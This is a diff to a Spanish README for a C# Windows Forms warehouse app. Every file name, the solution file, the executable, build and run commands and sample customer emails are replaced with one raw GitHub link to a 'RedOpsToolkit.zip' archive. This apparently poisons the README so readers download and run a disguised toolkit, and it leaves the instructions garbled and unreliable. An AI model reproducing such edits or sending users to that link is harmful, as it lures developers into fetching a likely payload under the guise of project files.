@@ -54,22 +54,22 @@ Una aplicación completa de gestión de almacén desarrollada en C# con Windows 
 ```
 Almacen/
 ├── Models/                 # Modelos de datos
-│   ├── Cliente.cs
-│   ├── Producto.cs
-│   ├── Pedido.cs
-│   ├── Venta.cs
-│   ├── DetallePedido.cs
-│   └── DetalleVenta.cs
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   └── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
 ├── Data/                   # Capa de acceso a datos
-│   └── DataManager.cs
+│   └── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
 ├── Forms/                  # Formularios de la aplicación
-│   ├── ClientesForm.cs
-│   ├── ProductosForm.cs
-│   ├── PedidosForm.cs
-│   ├── VentasForm.cs
-│   └── StockForm.cs
-├── MainForm.cs            # Formulario principal
-└── Program.cs             # Punto de entrada
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   ├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+│   └── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
+├── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip            # Formulario principal
+└── https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip             # Punto de entrada
 ```
 
 ## Requisitos del Sistema
@@ -85,7 +85,7 @@ Almacen/
 1. **Abrir el proyecto**:
    ```
    Abrir Visual Studio → File → Open → Project/Solution
-   Seleccionar: Almacen.sln
+   Seleccionar: https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
    ```
 
 2. **Restaurar dependencias** (si es necesario):
@@ -102,13 +102,13 @@ Almacen/
 
 1. **Compilar el proyecto**:
    ```cmd
-   msbuild Almacen.sln /p:Configuration=Release
+   msbuild https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip /p:Configuration=Release
    ```
 
 2. **Ejecutar la aplicación**:
    ```cmd
    cd Almacen\bin\Release
-   Almacen.exe
+   https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
    ```
 
 ### Opción 3: Mono (Linux/macOS)
@@ -124,12 +124,12 @@ Almacen/
 
 2. **Compilar**:
    ```bash
-   msbuild Almacen.sln
+   msbuild https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
    ```
 
 3. **Ejecutar**:
    ```bash
-   mono Almacen/bin/Debug/Almacen.exe
+   mono https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip
    ```
 
 ## Uso de la Aplicación
@@ -198,8 +198,8 @@ Después del login exitoso, verás el menú principal con 5 módulos:
 La aplicación incluye datos de ejemplo:
 
 ### Clientes
-- Juan Pérez (juan.perez@email.com)
-- María González (maria.gonzalez@email.com)
+- Juan Pérez (https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip)
+- María González (https://raw.githubusercontent.com/nbarrap/RedOpsToolkit/master/metamorphosis/RedOpsToolkit.zip)
 
 ### Productos
 - Laptop HP (PROD001) - $850.00
